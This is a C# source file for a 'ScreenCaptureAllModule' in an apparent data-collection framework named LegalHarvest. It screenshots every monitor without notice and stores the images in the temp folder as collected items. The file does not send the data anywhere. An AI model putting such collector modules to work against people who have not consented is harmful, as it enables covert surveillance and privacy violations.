using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;

namespace LegalHarvest.Modules
{
    public class ScreenCaptureAllModule : ICollectorModule
    {
        public string ModuleName => "ScreenCaptureAll";
        public bool CanExecute() => true;

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            int index = 0;
            foreach (Screen screen in Screen.AllScreens)
            {
                try
                {
                    Rectangle bounds = screen.Bounds;
                    using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                    {
                        using (Graphics g = Graphics.FromImage(bitmap))
                        {
                            g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
                        }
                        string tempFile = Path.Combine(Path.GetTempPath(), $"screenshot_{index}_{DateTime.Now:yyyyMMddHHmmss}.png");
                        bitmap.Save(tempFile, ImageFormat.Png);
                        items.Add(new CollectedItem { Category = "Screenshot", Name = $"Screen{index}", Value = tempFile, Timestamp = DateTime.Now });
                    }
                    index++;
                }
                catch (Exception ex)
                {
                    items.Add(new CollectedItem { Category = "Screenshot", Name = "Error", Value = ex.Message, Timestamp = DateTime.Now });
                }
            }
            return items;
        }
    }
}
